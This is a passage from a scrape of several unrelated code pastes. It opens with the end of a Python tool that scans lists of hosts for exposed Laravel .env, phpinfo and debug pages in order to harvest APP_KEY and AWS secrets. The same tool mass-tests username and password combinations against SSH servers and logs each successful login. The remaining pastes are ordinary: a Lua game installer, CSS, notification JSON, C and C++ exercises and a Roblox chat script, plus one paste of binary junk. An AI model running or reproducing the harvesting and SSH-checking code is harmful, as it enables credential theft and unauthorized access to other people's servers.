                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                req = reformat_text_phpinfo(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False
    
def phpinfo_php(url):
    method = '/phpinfo.php'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                req = reformat_text_phpinfo(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def laravel_check(url):
    if not env(url):
        if not env_save(url):
            if not env_php(url):
                if not beta_env(url):
                    if not prod_env(url):
                        if not env_js(url):
                            if not debug(url):
                                if not phpinfo(url):
                                    if not phpinfo_php(url):
                                        print(""{}[\u001b[32;1m+\u001b[0m] {} [ {}Couldn't Find Anything{} ] "".format(fw,url,fr,fw))
                                        return False

def Laravelnyx():
    lista = list(x.strip() for x in open(input('{}[{}+{}] List : '.format(fw,fg,fw)),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(laravel_check,lista)
    except Exception as e:
        print(e)
        pass


#################################################################################

def login_ssh(string):
    host , username , password = str(string).split('|',2)
    cnx = False
    check_ip = match(r""^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"",host)
    if not check_ip:
        host = socket.gethostbyname(host)
    try:
        client = paramiko.client.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        cnx = True
        _stdin, _stdout,_stderr = client.exec_command('ls')
        res = _stdout.read().decode()
        if 'Invalid argument' not in str(res):
            if cnx:
                open('SSH_success.txt','a',errors='ignore').write('{}|{}|{}'.format(host,username,password) + '\n')
                print('{}[ SUCCESS ]{} {}'.format(fg,fw,host))
            else:
                print('{}[ BAD ]{} {}'.format(fr,fw,host))
            client.close()
        else:
            print('{}[ BAD ]{} {}'.format(fr,fw,host))
    except:
        print('{}[ BAD ]{} {}'.format(fr,fw,host))
        pass

def check_ssh():
    lista = open(input('{}[{}!{}]{} List : '.format(flc,fr,flc,fw)), 'r').read().splitlines()
    try:
        ThreadPoolExecutor(10).map(login_ssh ,lista)
    except:
        pass

def oni():
    msg = """"""{}     ⣰⡆                      ⠐⣆           \    ⣴⠁⡇    {}@Nyx_FallagaTn{}    ⢀⠃⢣           \    ⢻ ⠸⡀                     ⡜ ⢸⠇           \    ⠘⡄⢆⠑⡄     ⢀⣀⣀⣠⣄⣀⣀⡀     ⢀⠜⢠⢀⡆           \     ⠘⣜⣦⠈⢢⡀⣀⣴⣾⣿⡛⠛⠛⠛⠛⠛⡿⣿⣦⣄ ⡠⠋⣰⢧⠎           \      ⠘⣿⣧⢀⠉⢻⡟⠁⠙⠃    ⠈⠋ ⠹⡟⠉⢠⢰⣿⠏           \       ⠘⣿⡎⢆⣸⡄          ⠠⣿⣠⢣⣿⠏           \       ⡖⠻⣿⠼⢽            ⢹⠹⣾⠟⢳⡄           \       ⡟⡇⢨ ⢸⡀           ⡎ ⣇⢠⢿⠇           \       ⢹⠃⢻⡤⠚    {}⣀  ⢀{}    ⠙⠢⡼ ⢻           \       ⠸⡓⡄{}⢹⠦⠤⠤⠤⢾⣇  ⢠⡷⠦⠤⠤⠴⢺{}⢁⠔⡟           \       ⢠⠁⣷{}⠈⠓⠤⠤⠤⣞⡻  ⢸⣱⣤⠤⠤⠔⠁{}⣸⡆⣇           \       ⠘⢲⠋⢦⣀⣠⢴⠶ {}⠁  ⠈⠁{}⠴⣶⣄⣀⡴⠋⣷⠋           \        ⣿⡀  ⢀⡘⠶⣄⡀   ⣠⡴⠞⣶ ⢀ ⣼           \        ⠈⠻⣌⢢⢸⣷⣸⡈⠳⠦⠤⠞⠁⣷⣼⡏⣰⢃⡾⠋           \          ⠙⢿⣿⣿⡇⢻⡶⣦⣤⡴⡾⢸⣿⣿⣷⠏           \            ⢿⡟⡿⡄⣳⣤⣤⣴⢁⣾⠏⡿⠁           \            ⠈⣷⠘⠒⠚⠉⠉⠑⠒⠊⣸⠇           \             ⠈⠳⠶⠔⠒⠒⠲⠴⠞⠋{}           \ """""".format(fg,fr,fg,fr,fg,fr,fg,fr,fg,fr,fg,fw)
    line = ''
    lines = []
    for i in msg:
        if str(i) == '\\':
            lines.append(line)
            line = ''
        else:
            line += str(i)
    maxlen = 0
    for line in lines:
        if int(len(line)) > maxlen:
            maxlen = int(len(line))
    for line in lines:
        while int(len(line)) < maxlen:
            line += ' '
        print(str(line).center(os.get_terminal_size().columns , "" ""))
        # time.sleep(0.12)

def main():
    oni()
    print('\n')
    print('[ 1 ] SSH Grabber')
    print('[ 2 ] SSH Checker')
    print('\n')
    choice = input('{}[{}#{}] Nyx{}@{}Choice : '.format(fw,fg,fw,fy,fw))
    match choice:
        case '1':
            Laravelnyx()
        case '2':
            check_ssh()
        case _:
            print('{}[{}!{}]{} Wrong Choice..'.format(flc,fr,flc,fw))
            print('{}[{}!{}]{} Redirecting Back to Main'.format(flc,fr,flc,fw))
            time.sleep(2)
            main()
if __name__ == '__main__':
    main()"
mffRc9DY,Setup NAudioSystem,lego11,Lua,Sunday 28th of May 2023 11:52:42 AM CDT,"local maxw, maxh = term.getSize()
function clear()
    term.clear()
    term.setCursorPos(1, 1)
    term.setBackgroundColour(colours.black)
    term.setTextColor(colors.white)
end
function colore(sfumatura) term.setTextColour(sfumatura) end
function fineColore() term.setTextColour(colours.white) end
function sfondo(sfumaturaSfondo) term.setBackgroundColour(sfumaturaSfondo) end
function fineSfondo() term.setBackgroundColour(colours.black) end
 
-- IMPLEMENTAZIONE DEL DRAWFILLEDBOX
local function drawPixelInternal(xPos, yPos)
    term.setCursorPos(xPos, yPos)
    term.write("" "")
end
local tColourLookup = {}
for n = 1, 16 do
    tColourLookup[string.byte(""0123456789abcdef"", n, n)] = 2 ^ (n - 1)
end
function drawFilledBox(startX, startY, endX, endY, nColour)
    if type(startX) ~= ""number"" or type(startX) ~= ""number"" or type(endX) ~=
        ""number"" or type(endY) ~= ""number"" or
        (nColour ~= nil and type(nColour) ~= ""number"") then
        error(""Expected startX, startY, endX, endY, colour"", 2)
    end
 
    startX = math.floor(startX)
    startY = math.floor(startY)
    endX = math.floor(endX)
    endY = math.floor(endY)
 
    if nColour then term.setBackgroundColor(nColour) end
    if startX == endX and startY == endY then
        drawPixelInternal(startX, startY)
        return
    end
 
    local minX = math.min(startX, endX)
    if minX == startX then
        minY = startY
        maxX = endX
        maxY = endY
    else
        minY = endY
        maxX = startX
        maxY = startY
    end
 
    for x = minX, maxX do for y = minY, maxY do drawPixelInternal(x, y) end end
end

function titolo(testo)
    drawFilledBox(1, 1, maxw, 1, colors.red)
    term.setCursorPos((maxw - #testo) / 2, 1)
    colore(colors.white)
    term.write(testo)
    sfondo(colors.blue)
end
while true do
sfondo(colors.blue)
clear()
titolo(""Installazione N AUDIO SYSTEM"")
print(""\n\n"")
print(""Si sta eseguendo GEM su questo computer?"")
print(""\n1. Si\n2. No\n"")
local isGem = read()
if isGem == ""1"" then
shell.run(""rm /programs/icons/NPlayer"")
shell.run(""rm /programs/NPlayer"")
shell.run(""pastebin get Ei4HDiwy /programs/icons/NPlayer"")
shell.run(""pastebin get TyTyYRQd /programs/NPlayer"")
clear()
titolo(""Installazione N AUDIO SYSTEM"")
print(""\n\n"")
print(""Installazione completata. Rimuovere il disco."")
os.pullEvent(""disk_eject"")
os.reboot()
elseif isGem == ""2"" then
shell.run(""pastebin get TyTyYRQd /NPlayer"")
clear()
titolo(""Installazione N AUDIO SYSTEM"")
print(""\n\n"")
print(""Installazione completata.\nPer eseguire N Audio System, digitare nel terminale:\nnplayer\nRimuovere il disco."")
os.pullEvent(""disk_eject"")
os.reboot()
else
clear()
titolo(""Installazione N AUDIO SYSTEM"")
print(""\n\n"")
print(""Scelta non valida"")
sleep(1)
end
end"
7RWeJ9SW,Graph Paper 5/28/23,marshallsmyth,CSS,Sunday 28th of May 2023 11:40:28 AM CDT,"<!DOCTYPE html>   <html>   <head>   <meta name=""viewport"" content=""width=device-width, initial-scale=1""><title>Graph Paper   
 </title><style>@import url(https://fonts.googleapis.com/css?family=Macondo);  ::-webkit-scrollbar { width:16px;height:16px; } 
  ::-webkit-scrollbar-track {background:#006; } ::-webkit-scrollbar-thumb { border-radius:22px;background:#600; } 
 body { background:#100;overflow:auto; }     
 .maintext { text-align:center;font-family:macondo;font-size:22px;color:#f0a;line-height:11px; }       
 .text { position:fixed;top:122px;width:22px;text-align:left;font-family:macondo;font-size:20px;color:green;line-height:44px;margin-top:44px; }
      .falsetext { position:fixed;font-size:1200px;line-height:1100px;color:transparent; }
 
 .row1, .row2, .row3, .row4, .row5, .row6, .row7, .row8, .row9, .row10, .row11, .row12, .row13, .row14, .row15, .row16, .row17, .row18,
 .row19, .row20, .row21, .row22, .row23, .row24, .row25, .row26, .row27, .row28, .row29, .row30, .row31, .row32, .row33, .row34, .row35, .row36,
 .row37, .row38, .row39, .row40, .row41, .row42, .row43, .row44, .row45, .row46, .row47, .row48, .row49, .row50, .row51, .row52, .row53, .row54,
 .row55, .row56, .row57, .row58, .row59, .row60, .row61, .row62, .row63, .row64, .row65, .row66, .row67, .row68, .row69, .row70, .row71, .row72
 { position:fixed;border-left:1px solid gold;top:10px;height:30.5vw; }
 .row1 { left:10px; } .row2 { left:20px; } .row3 { left:30px; } .row4 { left:40px; } .row5 { left:50px; } .row6 { left:60px; } .row7 { left:70px; } 
 .row8 { left:80px; } .row9 { left:90px; } .row10 { left:100px; } .row11 { left:110px; } .row12 { left:120px; } .row13 { left:130px; } .row14 { left:140px; } 
 .row15 { left:150px; } .row16 { left:160px; } .row17 { left:170px; } .row18 { left:180px; } .row19 { left:190px; } .row20 { left:200px; } .row21 { left:210px; } 
 .row22 { left:220px; } .row23 { left:230px; } .row24 { left:240px; } .row25 { left:250px; } .row26 { left:260px; } .row27 { left:270px; } .row28 { left:280px; } 
 .row29 { left:290px; } .row30 { left:300px; } .row31 { left:310px; } .row32 { left:320px; } .row33 { left:330px; } .row34 { left:340px; } .row35 { left:350px; } 
 .row36 { left:360px; } .row37 { left:370px; } .row38 { left:380px; } .row39 { left:390px; } .row40 { left:400px; } .row41 { left:410px; } .row42 { left:420px; } 
 .row43 { left:430px; } .row44 { left:440px; } .row45 { left:450px; } .row46 { left:460px; } .row47 { left:470px; } .row48 { left:480px; } .row49 { left:490px; } 
 .row50 { left:500px; } .row51 { left:510px; } .row52 { left:520px; } .row53 { left:530px; } .row54 { left:540px; } .row55 { left:550px; } .row56 { left:560px; } 
 .row57 { left:570px; } .row58 { left:580px; } .row59 { left:590px; } .row60 { left:600px; } .row61 { left:610px; } .row62 { left:620px; } .row63 { left:630px; } 
 .row64 { left:640px; } .row65 { left:650px; } .row66 { left:660px; } .row67 { left:670px; } .row68 { left:680px; } .row69 { left:690px; } .row70 { left:700px; } 
 .row71 { left:710px; } .row72 { left:720px; } 
 
 .bar1, .bar2, .bar3, .bar4, .bar5, .bar6, .bar7, .bar8, .bar9, .bar10, .bar11, .bar12, .bar13, .bar14, .bar15, .bar16, .bar17, .bar18, .bar19, .bar20, .bar21, 
 .bar22, .bar23, .bar24, .bar25, .bar26, .bar27, .bar28, .bar29, .bar30, .bar31, .bar32, .bar33, .bar34, .bar35, .bar36, .bar37, .bar38, .bar39,  .bar40 
 { position:fixed;border-top:1px solid gold;left:0px;width:100%; }
 .bar1 { top:10px; } .bar2 { top:20px; } .bar3 { top:30px; } .bar4 { top:40px; } .bar5 { top:50px; } .bar6 { top:60px; } .bar7 { top:70px; } 
 .bar8 { top:80px; } .bar9 { top:90px; } .bar10 { top:100px; } .bar11 { top:110px; } .bar12 { top:120px; } .bar13 { top:130px; } .bar14 { top:140px; } 
 .bar15 { top:150px; } .bar16 { top:160px; } .bar17 { top:170px; } .bar18 { top:180px; } .bar19 { top:190px; } .bar20 { top:200px; } .bar21 { top:210px; } 
 .bar22 { top:220px; } .bar23 { top:230px; } .bar24 { top:240px; } .bar25 { top:250px; } .bar26 { top:260px; } .bar27 { top:270px; } .bar28 { top:280px; } 
 .bar29 { top:290px; } .bar30 { top:300px; } .bar31 { top:310px; } .bar32 { top:320px; } .bar33 { top:330px; } .bar34 { top:340px; } 
 .bar35 { top:350px; } .bar36 { top:360px; } .bar37 { top:370px; } .bar38 { top:380px; } .bar39 { top:390px; } .bar40 { top:400px; } 
 
   </style> 
 
 <div class=""row1""></div><div class=""row2""></div><div class=""row3""></div><div class=""row4""></div><div class=""row5""></div>
 <div class=""row6""></div><div class=""row7""></div><div class=""row8""></div><div class=""row9""></div><div class=""row10""></div>
 <div class=""row11""></div><div class=""row12""></div><div class=""row13""></div><div class=""row14""></div><div class=""row15""></div>
 <div class=""row16""></div><div class=""row17""></div><div class=""row18""></div> <div class=""row19""></div><div class=""row20""></div>
 <div class=""row21""></div><div class=""row22""></div><div class=""row23""></div> <div class=""row24""></div><div class=""row25""></div>
 <div class=""row26""></div><div class=""row27""></div><div class=""row28""></div> <div class=""row29""></div><div class=""row30""></div>
 <div class=""row31""></div><div class=""row32""></div><div class=""row33""></div> <div class=""row34""></div><div class=""row35""></div>
 <div class=""row36""></div> <div class=""row37""></div><div class=""row38""></div><div class=""row39""></div><div class=""row40""></div>
 <div class=""row41""></div> <div class=""row42""></div><div class=""row43""></div><div class=""row44""></div><div class=""row45""></div>
 <div class=""row46""></div> <div class=""row47""></div><div class=""row48""></div><div class=""row49""></div><div class=""row50""></div>
 <div class=""row51""></div> <div class=""row52""></div><div class=""row53""></div><div class=""row54""></div> <div class=""row55""></div>
 <div class=""row56""></div><div class=""row57""></div><div class=""row58""></div><div class=""row59""></div> <div class=""row60""></div>
 <div class=""row61""></div><div class=""row62""></div><div class=""row63""></div><div class=""row64""></div> <div class=""row65""></div>
 <div class=""row66""></div><div class=""row67""></div><div class=""row68""></div><div class=""row69""></div> <div class=""row70""></div>
 <div class=""row71""></div><div class=""row72""></div>


<div class=""bar1""></div><div class=""bar2""></div><div class=""bar3""></div>
<div class=""bar4""></div><div class=""bar5""></div><div class=""bar6""></div><div class=""bar7""></div><div class=""bar8""></div>
<div class=""bar9""></div><div class=""bar10""></div><div class=""bar11""></div><div class=""bar12""></div><div class=""bar13""></div>
<div class=""bar14""></div><div class=""bar15""></div><div class=""bar16""></div><div class=""bar17""></div><div class=""bar18""></div>
<div class=""bar19""></div><div class=""bar20""></div><div class=""bar21""></div><div class=""bar22""></div><div class=""bar23""></div>
<div class=""bar24""></div><div class=""bar25""></div><div class=""bar26""></div><div class=""bar27""></div><div class=""bar28""></div>
<div class=""bar29""></div><div class=""bar30""></div><div class=""bar31""></div><div class=""bar32""></div><div class=""bar33""></div>
<div class=""bar34""></div><div class=""bar35""></div><div class=""bar36""></div><div class=""bar37""></div><div class=""bar38""></div>
<div class=""bar39""></div><div class=""bar40""></div>

"
LxcgXZtZ,funny,RobloxingGamerCool,Lua,Sunday 28th of May 2023 11:31:00 AM CDT,x����VJֵ�3��0U�2�Q�S����U�����������������a��RP�PS(P�D�P�(�6V�Z���. ��D�6��D
f3A3RMKw,Notification API Test,ProgrammingPhantom,JSON,Sunday 28th of May 2023 10:53:58 AM CDT,"[
  {
    ""id"": 0,
    ""title"": ""This is the first notification"",
    ""body"": ""This is the body of the first notification.\nMaybe this should be a second line? Not sure :)"",
    ""payload"": """"
  },
  {
    ""id"": 1,
    ""title"": ""Second notification"",
    ""body"": ""This this the second notification."",
    ""payload"": ""Weeoo""
  },
  {
    ""id"": 2,
    ""title"": ""Third one"",
    ""body"": ""Hello, this is the third one :)"",
    ""payload"": ""dwadwaawdwad""
  }
]"
p0FFcsnM,lb4,maxim_shlyahtin,C++,Sunday 28th of May 2023 10:29:29 AM CDT,"class CustomStack {
public:
// конструкторы и деструктор
    CustomStack() {
        mCapacity = 10; // начальная ёмкость стека
        mSize = 0;
        mData = new char *[mCapacity];
    }

    explicit CustomStack(int capacity) {
        mCapacity = capacity;
        mSize = 0;
        mData = new char *[mCapacity];
    }

    ~CustomStack() {
        for (size_t i = 0; i < mSize; ++i) {
            delete[] mData[i];
        }
        delete[] mData;
    }

// методы действий со стеком
    void push(const char *val) {
        if (mSize >= mCapacity) {
            extend(mCapacity); // увеличиваем ёмкость стека при необходимости
        }
        mData[mSize] = new char[strlen(val) + 1];
        strcpy(mData[mSize], val);
        ++mSize;
    }

    void pop() {
        if (!empty()) {
            delete[] mData[mSize - 1];
            --mSize;
        }
    }

    char *top() {
        if (!empty()) {
            return mData[mSize - 1];
        }
        return nullptr;
    }

    size_t size() {
        return mSize;
    }

    bool empty() {
        return mSize == 0;
    }

    void extend(int n) {
        mCapacity += n;
        char **newData = new char *[mCapacity];
        for (size_t i = 0; i < mSize; ++i) {
            newData[i] = mData[i];
        }
        delete[] mData;
        mData = newData;
    }

private:
    size_t mCapacity{}; // максимальная ёмкость стека
    size_t mSize{}; // количество элементов в стеке
protected:
    char **mData; // указатель на массив данных
};

int main() {
    string data;
    getline(cin, data);
    int count_open_tags = 0;
    int count_closing_tags = 0;
    for (int i = 1; i < data.size(); i++) {
        if (data[i - 1] == '<' && data[i] != '/')
            count_open_tags++;
        else if(data[i - 1] == '<' && data[i] == '/')
            count_closing_tags++;
    }
    CustomStack open_tags(count_open_tags);
    for (int i = 0; i < data.size(); i++) {
        char res[10];
        res[0] = '\0';
        if (data[i] == '<'){
            int j = i + 1, n = 0;
            while(data[j] != '>') {
                res[n] = data[j];
                n++; j++;
            }
            res[n] = '\0';
            if(res[0] == '/'){
                char *check = open_tags.top();
                for(int k = 1; res[k]; k++)
                    if(check[k - 1] != res[k]){
                        cout << ""wrong"";
                        return 0;
                    }
                open_tags.pop();
            }
            else if(strcmp(res, ""br"") != 0 && strcmp(res, ""hr"") != 0)
                open_tags.push(res);
            i = j;
        }
    }
    cout << ""correct"";
    return 0;
}"
zgmdWqfD,threeFibers,moldovexc,C,Sunday 28th of May 2023 10:24:17 AM CDT,"#include <ucontext.h>
#include <malloc.h>
#include <stdio.h>
 
#define FIBER_STACK 1024*64
 
ucontext_t uctx_func1,uctx_func2, uctx_func3, uctx_main;
 
void firstFiber(){
    printf(""Fiber1: started\n"");
    printf(""Fiber1: Now swap context to fiber2\n"");
    swapcontext(&uctx_func1, &uctx_func2);
    printf(""Fiber1: returned\n"");
    printf(""Fiber1: Now swap context to fiber2 again\n"");
    swapcontext(&uctx_func1, &uctx_func2);
}
void secondFiber(){
    printf(""Fiber2: started\n"");
    printf(""Fiber2: Now swap context to fiber3\n"");
    swapcontext(&uctx_func2, &uctx_func3);
    printf(""Fiber2: returned\n"");
    printf(""Fiber2: Now swap context to fiber3 again\n"");
    swapcontext(&uctx_func2, &uctx_func3);
 
}
void thirdFiber(){
    printf(""Fiber3: started\n"");
    printf(""Fiber3: Now swap context to fiber1\n"");
    swapcontext(&uctx_func3, &uctx_func1);
    printf(""Fiber3: returned\n"");
    printf(""Fiber3: Now swap context to fiber1 again\n"");
    swapcontext(&uctx_func3, &uctx_main);
}
 
int main(){
    getcontext(&uctx_func1);
    uctx_func1.uc_link = NULL;
    uctx_func1.uc_stack.ss_sp = malloc(FIBER_STACK);
    uctx_func1.uc_stack.ss_size = FIBER_STACK;
    uctx_func1.uc_stack.ss_flags = 0;
    makecontext(&uctx_func1, firstFiber, 0);
    
    getcontext(&uctx_func2);
    uctx_func2.uc_link = NULL;
    uctx_func2.uc_stack.ss_sp = malloc(FIBER_STACK);
    uctx_func2.uc_stack.ss_size = FIBER_STACK;
    uctx_func2.uc_stack.ss_flags = 0;
    makecontext(&uctx_func2, secondFiber, 0);
    
    getcontext(&uctx_func3);
    uctx_func3.uc_link = NULL;
    uctx_func3.uc_stack.ss_sp = malloc(FIBER_STACK);
    uctx_func3.uc_stack.ss_size = FIBER_STACK;
    uctx_func3.uc_stack.ss_flags = 0;
    makecontext(&uctx_func3, thirdFiber, 0);
    
 
    printf(""Main: swap context to fiber1\n"");
    swapcontext(&uctx_main, &uctx_func1);
    
   
 
 
    printf(""Main: returned\n"");
    printf(""Main: exiting\n"");
 
    return 0;
}"
Gkn7VrFy,NEOJ159 有限背包 bitset 優化,penguin71630,C++,Sunday 28th of May 2023 10:21:47 AM CDT,"#include <bits/stdc++.h>
using namespace std;

#define fastio ios_base::sync_with_stdio(false); cin.tie(0);
#define endl '\n'
#define _ << ' ' <<

// #pragma GCC optimize(""Ofast"")
// #pragma GCC target(""avx2,tune=native"")
#define siz(x) (int)x.size()
#define print(x) cout << #x << '\t'; for (auto& i : x) cout << i << ' '; cout << '\n'

typedef long long ll;
typedef pair<int, int> pii;
typedef pair<ll, ll> pll;

const int INF = 1e9;
const ll LINF = 1e18;
const ll MOD = 1e9 + 7;
const int maxn = 2e5 + 3;
const int maxc = 1e5 + 1;



int n, m;
bitset<20001> dp;
 
void init() {

    cin >> n >> m;
    dp.reset();
    dp[0] = true;

}



void solve() {

    int ok = false;
    vector<pair<int, int> > C;
    for (int i = 0; i < n; i++) {
        int v, c; cin >> v >> c;
        C.emplace_back(make_pair(v, c));
    }

    for (auto& [v, c] : C) {
        for (int k = 1; k <= c; k <<= 1) {  // 2 進位拆解

            // bitset 優化 0/1 背包
            dp = dp | (dp << (v*k));
            c -= k;

            if (dp[m]) { ok = true; break; }
        }
        if (c) { dp = dp | (dp << (v*c)); }
        if (dp[m]) ok = true;
        if (ok) break;
    }

    cout << (ok ? ""Yes"" : ""No"") << endl;

}

/*




*/


int main() {
    fastio

int T = 1;
cin >> T;
for (int kase = 1; kase <= T; kase++) {
    // cout << ""Case #"" << kase << "": "";
    // n = kase;
    init();
    solve();
}

    return 0;
}"
9V1vY98E,fnaf 6 true end chat messages (real),fred1rick_god,Lua,Sunday 28th of May 2023 10:08:43 AM CDT,"local args = {
    [1] = ""Connection terminated."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""I'm sorry to interupt you, ElizaBeth"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""If you even remenber that name,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""But im afraid you've been misinformed."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3)
local args = {
    [1] = ""You are not here to receive a gift,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""nor have you been called here by the individual you assume,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""although,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""you have indeed been called."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.2)
local args = {
    [1] = ""You have all been called here,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""into a labyrinth of sounds and smells,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.7)
local args = {
    [1] = ""misdirection and fortune."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.7)
local args = {
    [1] = ""A labyrinth with no exit,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.3)
local args = {
    [1] = ""a maze with no prize."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""You don't even realize that you are trapped."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""Your lust for blood has driven you on endless circles, chasing the cries for children in some unseen chamber,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(4.5)
local args = {
    [1] = ""always seeming so near,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""yet somehow out of reach, but you will never find them,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""None of you will. This is where your story ends."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(5)
local args = {
    [1] = ""And to you,my brave volunteer, who somehow found this job listing not intended for you,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(4)
local args = {
    [1] = ""although there was a way planned for you,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""I have a feeling that's not what you want."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.3)
local args = {
    [1] = ""I have a feeling that you are right where you want to be."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""I am remaining as well. I am nearby."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3.5)
local args = {
    [1] = ""This place will not be remembered,"",
    [2] = ""All""
}

